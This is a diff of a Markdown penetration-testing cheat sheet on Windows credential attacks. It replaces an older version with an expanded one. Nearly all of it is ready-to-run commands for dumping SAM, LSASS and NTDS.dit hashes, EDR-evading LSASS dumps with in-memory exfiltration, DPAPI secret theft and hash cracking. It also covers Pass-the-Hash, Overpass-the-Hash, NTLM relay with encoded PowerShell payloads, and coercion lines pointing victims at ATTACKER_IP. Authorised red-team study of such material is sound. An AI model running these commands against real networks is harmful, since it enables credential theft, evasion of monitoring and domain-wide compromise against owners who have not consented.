@@ -1,222 +1,226 @@
 # Windows Hash Attacks
 
-Techniques for extracting, cracking, relaying, and leveraging Windows NTLM and Net-NTLMv2 hashes for lateral movement and privilege escalation.
+Extracting, cracking, relaying, and reusing Windows credential material: NTLM, NetNTLMv1/v2, DCC (cached domain creds), LSA secrets, DPAPI, and Kerberos keys. Covers Pass-the-Hash, Pass-the-Key, NTLM relay, and modern LSASS-dumping / EDR-evasion. Companion to `cracking/password-cracking-guide.md`, `05-privilege-escalation/windows/`, and `08-active-directory/`.
+
+> Key distinction: the **NT hash** (mode 1000) is reusable directly (Pass-the-Hash) and only needs cracking to recover the plaintext. **NetNTLMv2** (mode 5600) is a challenge-response — it is NOT reusable as a hash, only **crackable** or **relayable**.
 
 ---
 
-## NTLM Hash Extraction
+## 1. Hash Types You'll Encounter
 
-### Mimikatz -- Local Hashes
+| Material | Format | Reusable? | Crack mode |
+|----------|--------|-----------|-----------|
+| **NT hash** | 32 hex | **Yes — PtH** | 1000 |
+| LM hash | 32 hex | legacy PtH | 3000 |
+| **NetNTLMv2** | `user::DOMAIN:chal:resp:resp` | No (relay or crack) | 5600 |
+| NetNTLMv1 | `user::DOMAIN:resp:resp:chal` | downgrade-crackable | 5500 |
+| **Kerberos NT/AES keys** | hex | Pass-the-Key / tickets | n/a |
+| DCC2 (MSCache v2) | `$DCC2$...` | No (crack only) | 2100 |
+| LSA secrets | varies | service/machine creds | n/a |
+| DPAPI masterkey/blobs | binary | decrypt → plaintext | (impacket-dpapi) |
+
+---
+
+## 2. Extraction
+
+### 2.1 Local SAM/SYSTEM (admin or SeBackup)
 ```cmd
-# Start Mimikatz as Administrator
-.\mimikatz.exe
+reg save HKLM\SAM   %TEMP%\sam
+reg save HKLM\SYSTEM %TEMP%\system
+reg save HKLM\SECURITY %TEMP%\security
+```
+```bash
+impacket-secretsdump -sam sam -system system -security security LOCAL    # NT hashes + LSA + cached
+```
 
-# Enable debug privilege
-privilege::debug
+### 2.2 Remote (need local admin on the target)
+```bash
+impacket-secretsdump DOMAIN/admin:pass@<ip>
+impacket-secretsdump -hashes :<NT> DOMAIN/admin@<ip>           # PtH
+nxc smb <range> -u admin -p pass --sam --lsa                  # SAM + LSA secrets
+nxc smb <range> -u admin -H <NT> --sam                        # PtH sweep dump
+```
 
-# Elevate to SYSTEM
-token::elevate
-
-# Extract SAM hashes
-lsadump::sam
-
-# Extract cached credentials
+### 2.3 LSASS memory (logon creds, Kerberos keys, sometimes plaintext)
+```cmd
+:: LOLBAS — comsvcs.dll MiniDump (signed, no mimikatz on disk)
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\l.dmp full
+tasklist /fi "imagename eq lsass.exe"        :: get the PID
+:: procdump (signed Sysinternals)
+procdump.exe -accepteula -ma lsass.exe l.dmp
+```
+Parse the dump offline (avoids running creds-tools on the host):
+```bash
+pypykatz lsa minidump l.dmp                  # logonpasswords/Kerberos keys
+```
+```
+:: mimikatz
+sekurlsa::minidump l.dmp
 sekurlsa::logonpasswords
+sekurlsa::ekeys                              :: Kerberos AES/RC4 keys (for pass-the-key)
 ```
 
-### NTLM Hash Cracking
+### 2.4 EDR-aware LSASS dumping (2025)
+Modern EDR hooks `MiniDumpWriteDump`/`NtReadVirtualMemory`. Use indirect-syscall / fork-clone tooling and **never write the dump to disk** when avoidable:
 ```bash
-# Crack NTLM hash (mode 1000)
-hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+# nanodump (Fortra) — indirect syscalls, process fork/snapshot, in-memory transfer
+nxc smb <ip> -u admin -p pass -M nanodump                     # remote, parses for you
+nxc smb <ip> -u admin -p pass -M nanodump -o NANO_PATH=...    # custom
+# lsassy — remote dump+parse over SMB (combines with secretsdump fallbacks)
+nxc smb <range> -u admin -p pass -M lsassy
+lsassy -u admin -p pass -d DOMAIN <ip>
+# Other quiet methods: handlekatz, dumpert (direct syscalls), --fork in nanodump
 ```
+> nanodump's `--fork` clones LSASS (`PROCESS_CREATE_PROCESS`) and dumps the clone, avoiding a direct read of LSASS — a common EDR trigger. Pair with in-memory exfil (no dump on disk).
 
----
-
-## Pass-the-Hash Attacks
-
-### SMB Access
+### 2.5 NTDS.dit (all domain hashes — needs DA or DC access)
 ```bash
-# smbclient with NTLM hash
-smbclient \\\\<target_ip>\\<share> -U <username> --pw-nt-hash <ntlm_hash>
-
-# Example
-smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+impacket-secretsdump DOMAIN/da:pass@<DC_IP> -just-dc -outputfile dc          # DCSync (network)
+nxc smb <DC_IP> -u da -p pass -M ntdsutil                                    # vss/ntdsutil dump
+impacket-secretsdump -ntds ntds.dit -system system LOCAL                     # offline from stolen files
 ```
 
-### Remote Code Execution
+### 2.6 Other credential stores
 ```bash
-# PsExec with hash (SYSTEM shell)
-impacket-psexec -hashes 00000000000000000000000000000000:<ntlm_hash> <username>@<target_ip>
-
-# WMIExec with hash (user shell)
-impacket-wmiexec -hashes 00000000000000000000000000000000:<ntlm_hash> <username>@<target_ip>
+nxc smb <range> -u admin -p pass -M lsassy            # LSASS
+nxc smb <range> -u admin -p pass --dpapi              # DPAPI (browser/cred-manager secrets)
+# DonPAPI / SharpDPAPI / pypykatz for masterkeys, vaults, RDP, Wi-Fi, browser creds
+impacket-dpapi masterkey -file mk -sid S-1-5-21-... -password pass
+impacket-dpapi credential -file cred -key <masterkey>
+.\SharpDPAPI.exe triage
+.\lazagne.exe all
 ```
 
 ---
 
-## Net-NTLMv2 Attacks
-
-### Capture with Responder
-```bash
-# Start Responder
-sudo responder -I <interface>
-
-# Example
-sudo responder -I tap0
-```
-
-### Force Authentication
-```cmd
-# From compromised Windows system
-dir \\<attacker_ip>\test
-
-# PowerShell
-ls \\<attacker_ip>\share
-```
-
-### Crack Net-NTLMv2
-```bash
-# Save captured hash to file
-cat > netntlmv2.hash << EOF
-user::DOMAIN:challenge:response:response
-EOF
-
-# Crack with Hashcat (mode 5600)
-hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt --force
-```
-
----
-
-## NTLM Relay Attacks
-
-### Setup Relay Attack
-```bash
-# ntlmrelayx with command execution
-impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "<command>"
-
-# Example with PowerShell reverse shell
-impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <base64_payload>"
-```
-
-### Trigger Relay
-```cmd
-# From compromised system
-dir \\<attacker_ip>\test
-```
-
----
-
-## Authentication Coercion Vectors
-
-### File Upload Attacks
-```bash
-# UNC path in file upload
-\\<attacker_ip>\share\nonexistent.txt
-```
-
-### Web Application Attacks
-```html
-<!-- HTML img tag -->
-<img src="\\<attacker_ip>\share\image.jpg">
-
-<!-- CSS background -->
-background: url('\\<attacker_ip>\share\image.jpg');
-```
-
----
-
-## Credential Guard Bypass
-
-### Check Credential Guard Status
-```powershell
-Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
-```
-
-### SSP Injection Bypass
-```cmd
-# In Mimikatz
-privilege::debug
-misc::memssp
-
-# Check captured credentials
-type C:\Windows\System32\mimilsa.log
-```
-
----
-
-## Hash Format Reference
-
-### NTLM Hash
-```
-Format: 32 hex characters
-Example: 8846f7eaee8fb117ad06bdd830b7586c
-```
-
-### Net-NTLMv2 Hash
-```
-Format: username::domain:challenge:response:response
-Example: paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000...
-```
-
----
-
-## Local Enumeration
-
-### PowerShell User Enumeration
-```powershell
-# List local users
-Get-LocalUser
-
-# Check user details
-net user <username>
-
-# Check group membership
-net localgroup administrators
-```
-
----
-
-## Impacket Tools Reference
+## 3. Cracking
 
 ```bash
-impacket-psexec      # Remote command execution (SYSTEM shell)
-impacket-wmiexec     # WMI command execution (user shell)
-impacket-smbexec     # SMB command execution
-impacket-ntlmrelayx  # NTLM relay attacks
-impacket-secretsdump # Extract secrets from remote systems
+hashcat -m 1000 nt.txt rockyou.txt -r best64.rule              # NT hash → plaintext
+hashcat -m 5600 netntlmv2.txt rockyou.txt -r best64.rule      # NetNTLMv2
+hashcat -m 5500 netntlmv1.txt rockyou.txt                     # NetNTLMv1
+hashcat -m 2100 dcc2.txt rockyou.txt                          # cached domain creds (slow)
+john --format=netntlmv2 --wordlist=rockyou.txt netntlmv2.txt
 ```
-
-### Mimikatz Modules
-```cmd
-privilege::     # Privilege operations
-token::         # Token manipulation
-sekurlsa::      # Security packages (logonpasswords)
-lsadump::       # LSA dump operations (sam)
-misc::          # Miscellaneous operations (memssp)
+### NetNTLMv1 downgrade → instant NT hash
+If a host negotiates NetNTLMv1, capture with a fixed challenge `1122334455667788` and convert to NT via crack.sh DES tables (effectively instant).
+```bash
+sudo responder -I eth0 --lm           # force LM/NTLMv1 downgrade
+# Submit the v1 hash to https://crack.sh  → recovers NT hash → Pass-the-Hash
 ```
 
 ---
 
-## Common Attack Scenarios
+## 4. Pass-the-Hash (reuse the NT hash, no plaintext)
 
-### Scenario 1: Local Admin Access
-1. Extract NTLM hashes with Mimikatz
-2. Crack hashes or use pass-the-hash
-3. Access other systems with same credentials
-
-### Scenario 2: Unprivileged Access
-1. Force authentication to Responder
-2. Capture Net-NTLMv2 hash
-3. Crack hash or relay to another system
-
-### Scenario 3: Credential Guard Enabled
-1. Inject malicious SSP with Mimikatz
-2. Wait for user authentication
-3. Capture plaintext credentials from log file
+```bash
+# Remote exec (LM:NT, empty LM = 32 zeros or just :NT)
+impacket-psexec  -hashes :<NT> DOMAIN/Administrator@<ip>      # SYSTEM shell (creates service)
+impacket-wmiexec -hashes :<NT> DOMAIN/Administrator@<ip>      # user shell (quieter)
+impacket-smbexec -hashes :<NT> DOMAIN/Administrator@<ip>
+evil-winrm -i <ip> -u Administrator -H <NT>                   # WinRM PtH
+nxc smb <range> -u Administrator -H <NT>                      # sweep ("Pwn3d!" = admin there)
+# SMB file access
+smbclient //<ip>/C$ -U Administrator --pw-nt-hash <NT>
+```
+```
+:: mimikatz (local injection)
+sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<NT> /run:cmd.exe
+```
+> PtH works with NTLM auth. In Kerberos-only/RestrictedAdmin estates, use **Pass-the-Key** or **Overpass-the-Hash** instead.
 
 ---
 
-## Defense Evasion Notes
-- Local Administrator account bypasses UAC remote restrictions
-- Other local admin users are affected by UAC remote restrictions
-- Domain accounts may have different restriction levels
+## 5. Pass-the-Key / Overpass-the-Hash (Kerberos)
+
+Use the NT hash or AES key to request a Kerberos TGT, then act over Kerberos (stealthier; bypasses some "NTLM disabled" controls).
+```bash
+impacket-getTGT -hashes :<NT> DOMAIN/user                     # OPtH (RC4)
+impacket-getTGT -aesKey <AES256> DOMAIN/user                  # pass-the-key (no RC4 = quieter)
+export KRB5CCNAME=user.ccache
+impacket-psexec -k -no-pass DOMAIN/user@target.fqdn
+```
+```
+Rubeus.exe asktgt /user:user /rc4:<NT> /ptt
+Rubeus.exe asktgt /user:user /aes256:<KEY> /ptt
+```
+
+---
+
+## 6. Capture & Relay NetNTLMv2 (when you can't crack it)
+
+Full coverage in `08-active-directory/ntlm-relay-and-coercion.md`; quick version:
+```bash
+# Capture (then crack -m 5600)
+sudo responder -I eth0
+# Force auth from a host you control / a victim:
+dir \\<ATTACKER_IP>\share          # cmd
+ls  \\<ATTACKER_IP>\share          # powershell
+# Relay instead of crack (SMB signing must be off on the target):
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <b64>"
+impacket-ntlmrelayx -t ldaps://<DC> --delegate-access          # RBCD
+impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController   # ESC8
+```
+
+### Coercion vectors (force the auth — see AD relay file)
+```bash
+PetitPotam.py -u u -p p <ATTACKER> <DC>          # MS-EFSR
+dfscoerce.py  -u u -p p <ATTACKER> <DC>          # MS-DFSNM
+coercer coerce -u u -p p -t <DC> -l <ATTACKER>   # all methods
+# Web/app injection vectors that trigger SMB/HTTP auth:
+\\<ATTACKER_IP>\share\x        # UNC in file upload / SQLi / XXE
+<img src="\\<ATTACKER_IP>\x">  # HTML/email
+```
+
+---
+
+## 7. Hash Format Reference
+
+```
+NT hash        : 8846f7eaee8fb117ad06bdd830b7586c                 (m 1000)
+NetNTLMv2      : user::DOM:<chal>:<HMAC>:<blob>                    (m 5600)
+NetNTLMv1      : user::DOM:<resp>:<resp>:1122334455667788         (m 5500)
+DCC2           : $DCC2$10240#username#<hash>                       (m 2100)
+secretsdump LM:NT line: user:RID:<LM>:<NT>:::
+```
+
+---
+
+## 8. Cheatsheet
+
+```bash
+# EXTRACT
+impacket-secretsdump -sam sam -system system LOCAL
+rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\Temp\l.dmp full ; pypykatz lsa minidump l.dmp
+nxc smb <range> -u admin -p pass -M lsassy            # EDR-aware remote
+impacket-secretsdump DOM/da:p@<DC> -just-dc           # all domain hashes
+
+# CRACK
+hashcat -m 1000 nt.txt rockyou.txt -r best64.rule
+hashcat -m 5600 v2.txt rockyou.txt
+
+# PASS-THE-HASH
+impacket-wmiexec -hashes :<NT> DOM/Administrator@<ip>
+evil-winrm -i <ip> -u Administrator -H <NT>
+nxc smb <range> -u Administrator -H <NT>               # find where admin
+
+# OVERPASS / PASS-THE-KEY
+impacket-getTGT -aesKey <AES> DOM/user; export KRB5CCNAME=user.ccache; impacket-psexec -k -no-pass DOM/user@host.fqdn
+
+# RELAY
+sudo responder -I eth0 ; impacket-ntlmrelayx -tf t.txt -smb2support -c "<cmd>"
+```
+
+---
+
+## References
+
+- impacket secretsdump/getTGT — https://github.com/fortra/impacket
+- pypykatz — https://github.com/skelsec/pypykatz
+- nanodump (Fortra) — https://github.com/fortra/nanodump
+- lsassy — https://github.com/Hackndo/lsassy
+- DonPAPI / SharpDPAPI — https://github.com/login-securite/DonPAPI , https://github.com/GhostPack/SharpDPAPI
+- Rubeus — https://github.com/GhostPack/Rubeus
+- crack.sh (NetNTLMv1 → NT) — https://crack.sh/
+- The Hacker Recipes – PtH / NTLM — https://www.thehacker.recipes/ad/movement/ntlm/pth
+- Red Siege – Dumping LSASS Like it's 2019 — https://redsiege.com/blog/2024/03/dumping-lsass-like-its-2019/
